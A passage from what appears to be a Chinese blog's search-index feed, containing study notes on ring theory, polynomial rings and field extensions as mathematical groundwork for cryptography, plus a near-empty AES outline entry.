type="math/tex">f^{\prime}\circ f{:}R\to R^{\prime\prime}</script>也是环同态</p><h3 id="嵌入映射"><a href="#嵌入映射" class="headerlink" title="嵌入映射"></a>嵌入映射</h3><p><img src="/2024/08/09/%E7%AD%91%E5%9F%BA%E7%AF%87%C2%B7%E6%8A%BD%E8%B1%A1%E4%BB%A3%E6%95%B0%C2%B7%E7%8E%AF%E8%AE%BA/image-20240814163834046.png" alt="image-20240814163834046"></p><h3 id="自然映射"><a href="#自然映射" class="headerlink" title="自然映射"></a>自然映射</h3><p><img src="/2024/08/09/%E7%AD%91%E5%9F%BA%E7%AF%87%C2%B7%E6%8A%BD%E8%B1%A1%E4%BB%A3%E6%95%B0%C2%B7%E7%8E%AF%E8%AE%BA/image-20240814163850181.png" alt="image-20240814163850181"></p><h3 id="例"><a href="#例" class="headerlink" title="例"></a>例</h3><p><img src="/2024/08/09/%E7%AD%91%E5%9F%BA%E7%AF%87%C2%B7%E6%8A%BD%E8%B1%A1%E4%BB%A3%E6%95%B0%C2%B7%E7%8E%AF%E8%AE%BA/image-20240814163906444.png" alt="image-20240814163906444"></p><hr><h2 id="单位-unit"><a href="#单位-unit" class="headerlink" title="单位(unit)"></a>单位(unit)</h2><p>有<strong>乘法逆元</strong>的元素称为<strong>单位</strong></p><p>定义：设环$R,a\in R$是，如果$\exists b\in R$,使得<script type="math/tex">ab=ba=e,</script>则称$a$为<strong>单位</strong></p><h3 id="单位群-group-of-units"><a href="#单位群-group-of-units" class="headerlink" title="单位群(group of units)"></a>单位群(group of units)</h3><p>定义：设环$R$,称<br>$R^<em>:={a|a\in R,a$ 是单位$}$为<strong>R的单位群</strong>。<br>$R^</em>$是乘法群，单位元是$e$ $(e\in R)$</p><p>$Z_n^*{:}Z_n\text{的单位群}$</p><h2 id="环同构-ring-isomorphism"><a href="#环同构-ring-isomorphism" class="headerlink" title="环同构(ring isomorphism)"></a><strong>环同构</strong>(ring isomorphism)</h2><ul><li>双射(单射&amp;满射)</li><li>环同态</li></ul><p>$R$与 $R^{\prime }$同构，记为$R\cong R^\prime$<br>$R$与$R$之间的同构：环自同构(ring automorphism)</p><h3 id="环-第一同构定理-first-isomorphism-theorem"><a href="#环-第一同构定理-first-isomorphism-theorem" class="headerlink" title="(环)第一同构定理(first isomorphism theorem)"></a>(环)第一同构定理(first isomorphism theorem)</h3><p>定理：设环$R$和$R^\prime,f{:}R\to R^\prime$是环同态(同态核是$Kerf$,同态像是$Imf$),则</p><script type="math/tex; mode=display">R/Kerf\cong Imf</script><script type="math/tex; mode=display">\rho:\quad[a]_{Kerf}\quad f(a)</script><p>$\rho^{\prime}:R/Kerf\to R^{\prime}\text{ 单一同态}$</p><h3 id="中国剩余映射"><a href="#中国剩余映射" class="headerlink" title="中国剩余映射"></a>中国剩余映射</h3><p>环同态   $f{:}Z\to Z_{n_1}\times\cdotp\cdotp\cdotp\times Z_{n_m}$</p><script type="math/tex; mode=display">a\quad f(a)=([a]_{n_1},...,[a]_{n_m})</script><script type="math/tex; mode=display">n_i|a\Leftrightarrow[a]_{n_i}=[0]_{n_i}</script><script type="math/tex; mode=display">n_1|a,...,n_m|a\Leftrightarrow([a]_{n_1},...,[a]_{n_m})=([0]_{n_1},...,[0]_{n_m})</script><p>$\Leftrightarrow a\in Kerf$<br>$\Leftrightarrow a\in nZ\Leftrightarrow nZ=Kerf$</p><p>环同构(中国剩余映射)<script type="math/tex">\rho{:}Z_n\to Z_{n_1}\times\cdotp\cdotp\cdotp\times Z_{n_m}</script><br>$[ a]$ $\rho ( a) = \left ( [ a] _{n_1}, . . . , [ a] _{n_m}\right ) ( = f( a) )$</p><hr><p>环同构$\rho{:}R\to R^{\prime}$<br>(乘法)群同构$\overline {\boldsymbol{\rho }}{: }R^<em> \to R^{\prime </em> }$ $(R ^<em> \cong R ^{\prime </em> })$</p><hr><p>(中国剩余映射)<script type="math/tex">\rho{:}Z_n\to Z_{n_1}\times\cdotp\cdotp\cdotp\times Z_{n_m}</script><br>(乘法)群同构<script type="math/tex">Z_n^*\cong Z_{n_1}^*\times\cdots\times Z_{n_m}^*</script><br>$[a]\quad([a]_{n_1},…,[a]_{n_m})$</p><hr><h2 id="多项式环-polynomial-ring"><a href="#多项式环-polynomial-ring" class="headerlink" title="多项式环(polynomial ring)"></a>多项式环(polynomial ring)</h2><h3 id="多项式-polynomial"><a href="#多项式-polynomial" class="headerlink" title="多项式(polynomial)"></a>多项式(polynomial)</h3><p>$f(x)=\sum_{i=0}^ka_ix^i=a_0+a_1x+\cdots+a_kx^k$</p><p>$a_0,a_1,…,a_k\in R$</p><p>$x为不定元，a_i为系数，a_0常数项，a_k首项系数，k为非负整数叫多项式的度(deg(f(x)))$</p><h3 id="多形式环-polynomial-ring"><a href="#多形式环-polynomial-ring" class="headerlink" title="多形式环(polynomial ring)"></a>多形式环(polynomial ring)</h3><p><strong>定义</strong>：所有关于不定元$x$、系数属于环$R$的多项式<br>$f(x)=a_0+a_1x+\cdots+a_kx^k$</p><script type="math/tex; mode=display">a_0,a_1,...a_k\in R</script><p>形成的环，称为$R$上的<strong>多项式环</strong>，记为$R[X]$。</p><p>$R$叫$R[X]$的<strong>基环(base ring)</strong>。</p><script type="math/tex; mode=display">\begin{aligned}&f(x)=a_0+a_1x+\cdots+a_kx^k\\&g(x)=b_0+b_1x+\cdots+b_mx^m\\&\text{加法:}f(x)+g(x)=c_0+\cdots+c_t\cdot x^t\\&t=max(k,m)\\&c_{i}=a_{i}+b_{i}, i=0,1,...,t\\&\text{乘法:}f(x)g(x)=c_0+\cdots+c_t\cdot x^t\\&t=k+m\\&c_{s}=\sum_{i=0}^{s}a_{i}b_{s-i}, s=0,1,...,t\end{aligned}</script><p><strong>注意</strong>：<script type="math/tex">f(x)g(x)\text{在}b\text{的取值未必等于}f(b)g(b)(乘法交换律)</script></p><h3 id="多项式除法-polynomial-division"><a href="#多项式除法-polynomial-division" class="headerlink" title="多项式除法(polynomial division)"></a>多项式除法(polynomial division)</h3><p>设域$F,f(x),g(x)\in F[X],g(x)\neq\theta$。存在唯一的$q(x),r(x)\in F[X]$,使得<br><script type="math/tex">f(x)=q(x)g(x)+r(x),\quad deg(r(x))<deg(g(x))</script></p><h3 id="一些性质"><a href="#一些性质" class="headerlink" title="一些性质"></a>一些性质</h3><script type="math/tex; mode=display">f(x)=a_0+a_1x+\cdots+a_kx^k；\quad g(x)=b_0+b_1x+\cdots+b_mx^m</script><script type="math/tex; mode=display">deg(f(x)+g(x))\leq max(deg(f(x)),deg(g(x)))\\deg(f(x)g(x))\leq deg(f(x))+deg(g(x))</script><script type="math/tex; mode=display">f(x)g(x)=a_0b_0+\cdots+a_kb_mx^{k+m}</script><p>$R$是整环，则<script type="math/tex">deg(f(x)g(x))=deg(f(x))+deg(g(x))</script></p><hr><p>$R={\theta}\Leftrightarrow R[X]={\theta}$<br>$S$是$R$的子环$\Leftrightarrow S[X]$是$R[X]$的子环<br>$R$ 是含幺环$\Leftrightarrow R[X]$是含幺环 (单位元都是$e)$<br>$R$ 是交换环$\Leftrightarrow R[X]$ 是交换环<br>$R$ 是整环$\Longrightarrow R[X]$ 是整环<br>$F$ 是域$\Longrightarrow F[X]$ 是整环$(F[X]$不是域)</p><h3 id="常数多项式-constant-polynomial"><a href="#常数多项式-constant-polynomial" class="headerlink" title="常数多项式 (constant polynomial)"></a>常数多项式 (constant polynomial)</h3><p>$a\in R$可以看成只有常数项的多项式</p><script type="math/tex; mode=display">a=a+\theta x+\cdots+\theta x^k,</script><p>称为常数多项式。<br>$R$是$R[X]$的子环    $R[X]$ 的零元：零多项式$\theta$</p><h3 id="首一多项式"><a href="#首一多项式" class="headerlink" title="首一多项式"></a>首一多项式</h3><p><strong>定义</strong>：设 $R$是含么环，$f(x)\in R[X],f(x)$的首项系数是单位元$e$,$f(x)$叫首一多项式。<br>例：设$a,b\in F$,则$a+bx+x^2$ 是首一多项式，因为首项系数(最高项$x^2$的系数)为$e$</p><p>$f(x)\in F[X],f(x)$的首项系数是$a_k,g(x)=a_k^{-1}\cdot f(x)$,则$g(x)$是首一多项式<br>易知，$deg(f(x))=deg(g(x))$</p><h3 id="域上多项式"><a href="#域上多项式" class="headerlink" title="域上多项式"></a>域上多项式</h3><ul><li>域$F$</li><li>多项式环$F[X]$</li></ul><h3 id="最大公因式"><a href="#最大公因式" class="headerlink" title="最大公因式"></a>最大公因式</h3><p><strong>定理</strong>：设域$F,f_1(x),…,f_n(x)\in F[X]$,$\exists f_i(x)\neq\theta(1\leq i\leq n)$。<br>$存在唯一的首一多项式d(x)\in F[X]$,使得<br>$d(x)|f_1(x),…,d(x)|f_n(x)$<br>$\forall c(x)\in F[X],c(x)|f_1(x),…,c(x)|f_n(x)$,则$c(x)|d(x)$<br>$d(x)$称为 $f_1(x),…,f_n(x)$ 的<strong>最大公因式</strong></p><p>必然存在$b_1(x),…,b_n(x)\in F[X]$,有</p><script type="math/tex; mode=display">d(x)=b_1(x)f_1(x)+\cdots+b_n(x)f_n(x)</script><p>如果 $gcd(f_1(x),…,f_n(x))=e$,称$f_1(x),…,f_n(x)$<strong>互素</strong></p><script type="math/tex; mode=display">gcd(f_1(x),...,f_n(x))=gcd(gcd(f_1(x),f_2(x)),...,f_n(x))</script><h4 id="多项式上的欧几里得算法"><a href="#多项式上的欧几里得算法" class="headerlink" title="多项式上的欧几里得算法"></a>多项式上的欧几里得算法</h4><p>求$f(x),g(x)\in F[X]$的最大公因式<br>$f\left(x\right)=q_{1}\left(x\right)g\left(x\right)+r_{1}\left(x\right)$<br>$g(x)=q_{2}(x)r_{1}(x)+r_{2}(x)$<br>$r_{1}(x)=q_{3}(x)r_{2}(x)+r_{3}(x)$<br>……<br>$r_{n-2}(x)=q_n(x)r_{n-1}(x)+r_n(x)$<br>$r_{n-1}(x)=q_{n+1}(x)r_n(x)$</p><script type="math/tex; mode=display">\text{设 }r_n(x)\text{首项系数为 }a_k(\neq e)\\gcd(f(x),g(x))=a_k^{-1}\cdot r_n(x)</script><h3 id="最小公倍式"><a href="#最小公倍式" class="headerlink" title="最小公倍式"></a>最小公倍式</h3><p><strong>定理</strong>：设域$F,f_1(x),…,f_n(x)\in F[X],\forall f_i(x)\neq\theta (1\leq i\leq n$)。存在<strong>唯一</strong>的<strong>首一多项式</strong>$m(x)\in F[X]$,使得<br>$f_1(x)|\boldsymbol{m}(x),…,f_n(x)|\boldsymbol{m}(x)$<br>$\forall c(x)\in F[X],f_1(x)|c(x),…,f_n(x)|c(x)$,则$m(x)|c(x)$<br>$m(x)$称为$f_1(x),…,f_n(x)$的<strong>最小公倍式</strong></p><script type="math/tex; mode=display">\begin{aligned}&\text{非零多项式}f(x),g(x)\in F[X]\text{,则}\\&a_k^{-1}\cdot f(x)g(x)=lcm(f(x),g(x))\cdot gcd(f(x),g(x)),\\&\text{其中,}a_k\text{ 是}f(x)g(x)\text{的首项系数}\end{aligned}</script><script type="math/tex; mode=display">lcm(f_1(x),...,f_n(x))=lcm(lcm(f_1(x),f_2(x)),...,f_n(x))$$</script><h3 id="多项式环的理想"><a href="#多项式环的理想" class="headerlink" title="多项式环的理想"></a>多项式环的理想</h3><p>加法子群→理想</p><ul><li>环$Z$:加法子群$(mZ,+)\to$理想$(Z,+,\times)$</li><li>环$Z_n$:加法子群 ($mZ_n,+)\to$理想 ($mZ_n,+,\times)$</li></ul><p><strong>定理</strong>:$设a\in R\text{,则 }J={g(x)\in R[X]|g(\alpha)=\theta}\text{是}R[X]的理想。$</p><p><strong>定理</strong>：$F[X]$ 是主理想整环。$F[X]$的每个非零理想$J$,都存在唯一的首一多项式$g(x)\in F[X]$,有$J=(g(x))$。(理想都是主理想的整环，称主理想整环)</p><p>$F[X]$ 是主理想整环$\Longrightarrow F[X]$ 的理想都是主理想<br>$F[X]$的理想都可以写成 $(f(x))$ 的形式，$f(x)\in F[X]$</p><script type="math/tex; mode=display">\begin{aligned}\left(f(x)\right)&=\{f(x)c(x)\mid c(x)\in F[X]\}\\&=\{c(x)f(x)\mid c(x)\in F[X]\}\end{aligned}</script><p>$\exists g( x) \in F[ X]$, $g( x)$是唯一的首一多项式，使$\left(f(x)\right)=\left(g(x)\right)$</p><h3 id="不可约多项式-irreducible-polynomial"><a href="#不可约多项式-irreducible-polynomial" class="headerlink" title="不可约多项式 (irreducible polynomial)"></a>不可约多项式 (irreducible polynomial)</h3><p><strong>定义</strong>：设域$F$,$p(x)\in F[X]$。如果$deg(p(x))&gt;0$,$p(x)=$ $b(x)c(x)$,则$deg(b(x))=0$或$deg(c(x))=0$(其中一个是常数多项式),称$p(x)$在$F$上不可约的(又称在 $F[X]$里不可约的或素的)</p><h4 id="F-X-中的唯一分解"><a href="#F-X-中的唯一分解" class="headerlink" title="$F[X]$中的唯一分解"></a>$F[X]$中的唯一分解</h4><p><strong>定理</strong>：$\forall g(x)\in F[X]$, $deg(g(x))&gt;0$,则$g(x)$可唯一地写成如下<strong>形式</strong>：</p><script type="math/tex; mode=display">g(x)=ap_1^{e_1}(x)p_2^{e_2}(x)...p_k^{e_k}(x),</script><p>其中，$a\in F,p_1(x),p_2(x),…,p_k(x)\in F[X]$是彼此不同的<strong>首一不可约多项式</strong>，$e_1,e_2,…,e_k\in\mathbb{N}$。</p><h2 id="代数扩域"><a href="#代数扩域" class="headerlink" title="代数扩域"></a>代数扩域</h2><ul><li><p><strong>扩域</strong>:$K$是$F$的子域，$F$就是$K$的扩域或扩张(extension)</p></li><li><p><strong>真子域</strong>:$K$还是$F$的真子集，则$K$是$F$的真子域</p></li><li><p><strong>素域</strong>(prime field):没有真子域的域</p><p><strong>定理1</strong>：域$F$所有子域的交集$K$构成它的素子域。</p><p><strong>定理2</strong>：设$K$是$F$的子域，集合$M\subseteq F$,记 $K(M)$ 是$F$所有包含$K$和$M$的子域的交集。<br>$(1)K(M)$是$K$的扩域。<br>$(2)K(M)$是包含$K$和$M$的最小子域。</p><blockquote><p>素域的任何真子集都不可能构成它的子域<br>素域的任何子域都是它本身</p><p><strong>例</strong>：有理数域是素域</p></blockquote></li></ul><h3 id="代数扩域-algebraic-extension-field"><a href="#代数扩域-algebraic-extension-field" class="headerlink" title="代数扩域(algebraic extension field)"></a>代数扩域(algebraic extension field)</h3><p><strong>定义</strong>：$K$是$F$的子域，则</p><p>(1) 对于$a\in F$,存在非常数多项式$f(\boldsymbol{x})$,其系数来自$K$,有<br>$f(a)=\theta$,称$a$ 是$K$上<strong>代数的</strong>。(如果<strong>不存在</strong>这样的多项式，$a$叫$K$上<strong>超越的</strong>)</p><p>(2)$L$是$K$的扩域。$\forall b\in L$是$K$上代数的，称$L$是$K$的代数扩域或<strong>代数扩张</strong> (algebraic extension)。</p><p><strong>定理</strong>：$J={f(x)\in K[X]|f(a)=\theta}$,存在唯一的首一多项式$g(x)\in K[X]$,有$J=(g(x))$。<br><strong>定理</strong>：以上$g(x)$是$K[X]$中不可约多项式。</p><h3 id="极小多项式-minimal-polynomial"><a href="#极小多项式-minimal-polynomial" class="headerlink" title="极小多项式 (minimal polynomial)"></a>极小多项式 (minimal polynomial)</h3><p>性质：$K$是$F$的子域，$a$是$K$上代数的，相应的极小多项式为</p><p>$g(x)\in K[X]$,则：</p><ol><li><p>$g(x)$ 是$K[X]$里的不可约多项式 (证明见上期)</p></li><li><script type="math/tex; mode=display">g(x)\mid f(x)\Leftrightarrow f(x)\in K[X],\:f(a)=\theta</script></li><li><p>$g(x)$是$K[X]$里以$a$为根的首一多项式中度最小的</p><script type="math/tex; mode=display">J=(g(x))=\{f(x)\in K[X]|f(a)=\theta\}</script></li></ol><h2 id="域的扩张"><a href="#域的扩张" class="headerlink" title="域的扩张"></a>域的扩张</h2><p>扩域是向量空间</p><p><strong>定理：域是其任意子域上的向量空间</strong></p><h3 id="向量空间-vector-space"><a href="#向量空间-vector-space" class="headerlink" title="向量空间(vector space)"></a>向量空间(vector space)</h3><p>定义：设$v$是非空集合，$K$的域，$V$中元素称为<strong>向量(vector)</strong>,$K$称为其<strong>基域(base field)</strong>, $K$中元素称为<strong>标量(scalar)</strong>。</p><p><strong>基</strong>：最大线性无关向量组</p><p>基里向量的个数=<strong>向量空间维度</strong>$= [ F{: }K]$ $( K$上$F$的度)</p><blockquote><p>n维欧几里得空间$R^n$<br>实系数度不超过$n$的全体多项式<br>以实数为定义域和值域的全体连续函数</p></blockquote><p>$V$是$K$上的向量空间,须满足以下条件(或称公理):$\quad\forall X,Y\in V,\forall a,b\in K,e\in K$</p><ul><li><strong>加法阿贝尔群</strong>:向量间的加法</li><li><strong>标量乘法</strong>:<ul><li>封闭性:$aX\in V$</li><li>结合律:$a(bX)=(abX)$</li><li>单位元: $eX=X$</li><li>分配律:$a(X+Y)=aX+aY\quad(a+b)X=aX+bX$</li></ul></li></ul><h3 id="有限扩张-finite-extension"><a href="#有限扩张-finite-extension" class="headerlink" title="有限扩张(finite extension)"></a>有限扩张(finite extension)</h3><p><strong>定义</strong>：设$F$是K的扩域。$F$是$K$上有限维度的向量空间，称$F$是$K$的<strong>有限扩张</strong>或<strong>有限扩域</strong> (finite extension field) 。</p><p>有限域是有限维度的向量空间$\Longrightarrow$有限域的度是有限的</p><p>每个域可以看作自身的优先扩张：</p><ul><li>$[K{:}K]=1$</li><li>$[F{:}K]=1\Leftrightarrow F=K$</li></ul><blockquote><ul><li><p>$[Q(\sqrt2):Q]=2\ 基：{1、\sqrt2}$ </p><p>$Q(\sqrt2)={a+b\sqrt2\|a,b\in Q}$</p></li><li><p>$[C:R]=2\ 基：{1、i}$</p></li><li><p>$[R:Q]=∞$</p></li></ul></blockquote><p><strong>定理1</strong>：$F$是$L$的有限扩张，$L$是$K$的有限扩张，则$F$是$K$的有限扩张，且<br>$[F:K]=[F:L][L:K]$</p><p><strong>定理2</strong>：有限扩张时代数扩张(代数扩域)</p><h3 id="单代数扩张-simple-algebraic-extension"><a href="#单代数扩张-simple-algebraic-extension" class="headerlink" title="单代数扩张(simple algebraic extension)"></a>单代数扩张(simple algebraic extension)</h3><p><strong>定义：</strong>$F$是$K$的扩域，$a\in F$,且$a$是$K$上代数的，称$K(a)$是 $K$的<strong>单</strong><br><strong>代数扩张或单代数扩域 (simple algebraic extension field)</strong>。</p><p><strong>定理1</strong>:$g(x)\in K[X]是不可约多项式\Rightarrow(g(x))是极大理想$</p><p><strong>定理2</strong>:$g(x)\in K[X]是K上不可约多项式,则存在K的单代数扩张,它以g(x)的根为定义元素$</p><p><strong>定理3</strong>:$g(x)\in K[X]$是$K$上不可约多项式，$a,b$是$g(x)$的两个根，则$K(a)\cong K(b)$ (同构为把$a$映射成$b)$</p><p>$I$是极大理想$\Leftrightarrow R/I$ 是域($R$是含幺交换环)</p><p>$(g(x))$是极大理想$\Leftrightarrow K[X]/(g(x))$   ($K[X]$是含幺交换环)</p><p>设$F$是$K$的扩域，$a\in F$是$K$上代数的，$g(x)$是相应的极小多项式，<br>度为$n$,则:</p><ul><li>性质1:$K(a)\cong K[X]/(g(x))$</li><li>性质2:$[K(a):K]=n$,且$(e,a,…,a^{n-1})$是$K$上$K(a)$的基</li><li>性质3:$\forall b\in K(a)$都是$K$上代数的，相应极小多项式的度都是$n$<strong>的因子</strong></li></ul><p>$L$是$K$的有限扩张$\Rightarrow L$是$K$的代数扩张<br>$L$是$K$的有限扩张$\not\Leftarrow L$是$K$的代数扩张</p><blockquote><p>例：R是Q的扩域，$\sqrt2\in R$ </p><p>(1)$Q(\sqrt{2})$是Q的单代数扩张 ?</p><p>$g(x)=x^2-2\in Q[X]$,有$g(\sqrt{2})=0$,则$\sqrt{2}$是Q上代数的，<br>所以，$\mathbb{Q}(\sqrt{2})$是Q的单代数扩张。</p><p>(2)为什么$[Q( \sqrt {2}) {: }Q] = 2$ ? </p><p>事实上，$g(x)=x^2-2$是Q上$\sqrt{2}$的极小多项式。</p><p>因为$deg(g(x))=2$,所以$\left[Q(\sqrt{2}){:}Q\right]=2$,即$Q(\sqrt{2})$的基有两个元素</p><p>(3)$Q(\sqrt{2})$的元素都长什么样？</p><p>基的两个元素：($\sqrt2)^0=1$、($\sqrt{2})^1=\sqrt{2}$</p><p>因此，$Q(\sqrt2)={b_0+b_1\sqrt2\mid b_0,b_1\in Q}$</p><p>例：$Z_3={0,1,2}$是域，$g(x)=x^2+x+2\in\mathbb{Z}_3[X]$是$\mathbb{Z}_3$上不可约的。</p><p>设$a:=[x]\in\mathbb{Z}_3/(g(x))$是$g(x)$的根，即$g(a)=a^2+a+2=0$</p><p>因为$deg(g(x))=2$,则$Z_3(a)$的基有两个元素：$1=a^0$和$a=a^1$</p><p>所以，$Z_3(a)={b_0+b_1a\mid b_0,b_1\in Z_3}={0,1,2,a,a+1,a+2,2a,2a+1,2a+2}$</p><p>$2a+2$也是$g(x)$的根，因为$g(2a+2)=(2a+2)^2+(2a+2)+2=0$<br>因为$deg(g(x))=2$,则$Z_3(2a+2)$的基有两个元素：1和$2a+2$<br>所以，$Z_3(2a+2)={b_0+b_1(2a+2)\mid b_0,b_1\in Z_3}={0,1,2,a,a+1,a+2,2a,2a+1,2a+2}=Z_3(a)$</p></blockquote><h4 id="构造单代数扩张"><a href="#构造单代数扩张" class="headerlink" title="构造单代数扩张"></a>构造单代数扩张</h4><ul><li>1.$找K上不可约多项式,设为g(x)$</li><li>2.$找g(x)的一个根,设为a。单代数扩张就是K(a)$</li><li>3.$设deg(g(x))=n,则K(a)的基为: e,a,…,a^{n-1}$</li><li>4.$K(a)元素:b_0+b_1a+\cdots+b_{n-1}a^{n-1}\left(b_i\in K\right)$</li></ul><h4 id="应用单代数扩张"><a href="#应用单代数扩张" class="headerlink" title="应用单代数扩张"></a>应用单代数扩张</h4><p><strong>定理1</strong>:$F是K的扩域,a,b\in F,则 K(a,b)=K(a)(b)$</p><p><strong>定理2</strong>:$F是K的扩域，a_1,…,a_m\in F,则K(a_1,…,a_m)=K(a_1,…,a_{m-1})(a_m)$</p><p><strong>定理3</strong>:$a_1,…,a_m是K上代数的\Rightarrow K(a_1,…,a_m)$是有限扩张/代数扩张</p><blockquote><p>如何计算 $K(a_1,…,a_m)$ 的扩张维度$[K(a_1,…,a_m){:}K]$</p><p>例：求 [$Q(\sqrt2,\sqrt3){:}Q]$</p><p>解：$[Q(\sqrt{2}){:}Q]=2,[Q(\sqrt{2})(\sqrt{3}){:}Q(\sqrt{2})]=2$</p><script type="math/tex; mode=display">\begin{aligned}[Q(\sqrt{2},\sqrt{3});Q]&=[Q(\sqrt{2})(\sqrt{3});Q]\\&=[Q(\sqrt{2})(\sqrt{3});Q(\sqrt{2})][Q(\sqrt{2});Q]\\&=2\times2\\&=4\end{aligned}</script></blockquote><p><strong>定理4</strong>：$L$是K的有限扩张$\Leftrightarrow$存在$a_1,…,a_m\in L$是$K$上代数的，使得$L=K(a_1,…,a_m)$</p><h3 id="分裂域-splitting-field"><a href="#分裂域-splitting-field" class="headerlink" title="分裂域(splitting field)"></a>分裂域(splitting field)</h3><p><strong>定义(分裂)</strong>:$L$是$K$的扩域，$f(x)\in K[X]$是非常数多项式 $(deg(f(x))&gt;0),如果f(x)$可以写成一次因式乘积的形式：<br>$f(x)=b(x-a_1)(x-a_2)…(x-a_m)$ ($b$是$f(x)$首项系数)<br>其中，$a_1,…,a_m\in L$,称 $f(x)$在$L$里<strong>分裂</strong>。</p><p><strong>定义(分裂域)</strong>:$f(x)$在$L$里分裂，且$L=K(a_1,…,a_m)$,则称$L$是$K$上$f(x)$<br>的<strong>分裂域</strong>。</p><p><strong>分裂域是有限扩张/代数扩张</strong></p><p>$[L:K]\leq deg(f(x))$</p><p>用不可约多项式的一个根$a$构造的域$K(a)$不一定是$g(x)$的分裂域，因为它未必包含$g(x)$的所有根。</p><blockquote><script type="math/tex; mode=display">\begin{aligned}&\text{例:}f(x)=3(x^2-2)(x^2-3)(x^2-6)(x^2+1)\in Q[X]\text{,求}f(x)\text{的分裂域}\\&\text{解:}f(x)=3(x^2-2)(x^2-3)(x^2-6)(x^2+1)\\&=3(x-\sqrt{2})(x+\sqrt{2})(x-\sqrt{3})(x+\sqrt{3})\\&(x-\sqrt{6})(x+\sqrt{6})(x-i)(x+i)\\&\text{所以,}f(x)\text{的根为}\pm\sqrt{2}\text{、}\pm\sqrt{3}\text{、}\pm\sqrt{6}\text{、}\pm i\text{。}\end{aligned}</script><p><script type="math/tex">Q(\sqrt{2},-\sqrt{2},\sqrt{3},-\sqrt{3},\sqrt{6},-\sqrt{6},i,-i)</script>化简思考过程：</p><ul><li>$-\sqrt{2}\in Q(\sqrt{2})$,则$Q(\sqrt{2},-\sqrt{2})=Q(\sqrt{2})$</li><li>$\sqrt{3}\notin Q(\sqrt{2}$ ),则$Q(\sqrt{2},-\sqrt{2},\sqrt{3})=Q(\sqrt{2},\sqrt{3})$</li><li>$-\sqrt{3}\in Q(\sqrt{2},\sqrt{3})$,则$Q(\sqrt{2},-\sqrt{2},\sqrt{3},-\sqrt{3})=Q(\sqrt{2},\sqrt{3})$</li><li>$\pm\sqrt{6}\in Q(\sqrt{2},\sqrt{3})$,则$Q(\sqrt{2},-\sqrt{2},\sqrt{3},-\sqrt{3},\sqrt{6},-\sqrt{6})=Q(\sqrt{2},\sqrt{3})$</li><li>$i\notin Q(\sqrt{2},\sqrt{3})$,则$Q(\sqrt{2},-\sqrt{2},\sqrt{3},-\sqrt{3},\sqrt{6},-\sqrt{6},i)=Q(\sqrt{2},\sqrt{3},i)$</li><li>$-i\in Q(\sqrt{2},\sqrt{3},i)$,则$Q(\sqrt{2},-\sqrt{2},\sqrt{3},-\sqrt{3},\sqrt{6},-\sqrt{6},i,-i)=Q(\sqrt{2},\sqrt{3},i)$</li></ul><p>$f(x)的分裂域为Q(\sqrt{2},\sqrt{3},i)(它是包含Q和f(x)所有根的最小扩域)$</p></blockquote><p><strong>定理1(分裂域的存在性和唯一性)</strong>:对于$\forall f(x)\in K[X]$非常数多项式则存在$K$上$f(x)$的分裂域。而且，任何$K$上$f(x)$ 的分裂域都是同构的</p><h4 id="分裂域的应用重根判别式"><a href="#分裂域的应用重根判别式" class="headerlink" title="分裂域的应用重根判别式"></a>分裂域的应用重根判别式</h4><p><strong>定义(判别式)</strong>:$f(x)\in K[X],deg(f(x))\geq2,f(x)=b(x-a_1)(x-$<br>$a_2)…(x-a_m)$ (b是$f(x)$首项系数),$a_1,…,a_m$属于$f(x)$在$K$ 上的分裂域，则$f(x)$的<strong>判别式(discriminant)</strong>为</p><script type="math/tex; mode=display">D\big(f(x)\big)=b^{2m-2}\prod_{1\leq i<j\leq m}(a_i-a_j)^2</script>]]></content>
      
      
      <categories>
          
          <category> Crypto数学基础 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 密码学 </tag>
            
            <tag> 筑基篇 </tag>
            
            <tag> 抽象代数 </tag>
            
            <tag> 环论 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>密码算法篇·AES</title>
      <link href="/2024/08/04/%E5%AF%86%E7%A0%81%E7%AE%97%E6%B3%95%E7%AF%87%C2%B7AES/"/>
      <url>/2024/08/04/%E5%AF%86%E7%A0%81%E7%AE%97%E6%B3%95%E7%AF%87%C2%B7AES/</url>
      
        <content type="html"><![CDATA[<p><a href="https://github.com/francisrstokes/githublog/blob/main/2022/6/15/rolling-your-own-crypto-aes.md">githublog/2022/6/15/rolling-your-own-crypto-aes.md at main · francisrstokes/githublog</a></p><h2 id="初始变换-initial-round"><a href="#初始变换-initial-round" class="headerlink" title="初始变换(initial round)"></a>初始变换(initial round)</h2><h2 id="9轮循环运算-9-rounds"><a href="#9轮循环运算-9-rounds" class="headerlink" title="9轮循环运算(9 rounds)"></a>9轮循环运算(9 rounds)</h2><h3 id="字节代换-SubBytes"><a href="#字节代换-SubBytes" class="headerlink" title="字节代换(SubBytes)"></a>字节代换(SubBytes)</h3><p>查表</p><h3 id="行移位-ShiftRows"><a href="#行移位-ShiftRows" class="headerlink" title="行移位(ShiftRows)"></a>行移位(ShiftRows)</h3><h3 id="列混合-MixColumns"><a href="#列混合-MixColumns" class="headerlink" title="列混合(MixColumns)"></a>列混合(MixColumns)</h3><h3 id="轮密钥加-AddRoundKey"><a href="#轮密钥加-AddRoundKey" class="headerlink" title="轮密钥加(AddRoundKey)"></a>轮密钥加(AddRoundKey)</h3><h2 id="1轮最终轮-Final-Round"><a href="#1轮最终轮-Final-Round" class="headerlink" title="1轮最终轮(Final Round)"></a>1轮最终轮(Final Round)</h2>]]></content>
      
      
      <categories>
          
          <category> 密码算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 密码学 </tag>
            
            <tag> AES </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>筑基篇·抽象代数·群论</title>
      <link href="/2024/08/01/%E7%AD%91%E5%9F%BA%E7%AF%87%C2%B7%E6%8A%BD%E8%B1%A1%E4%BB%A3%E6%95%B0%C2%B7%E7%BE%A4%E8%AE%BA/"/>
      <url>/2024/08/01/%E7%AD%91%E5%9F%BA%E7%AF%87%C2%B7%E6%8A%BD%E8%B1%A1%E4%BB%A3%E6%95%B0%C2%B7%E7%BE%A4%E8%AE%BA/</url>
      
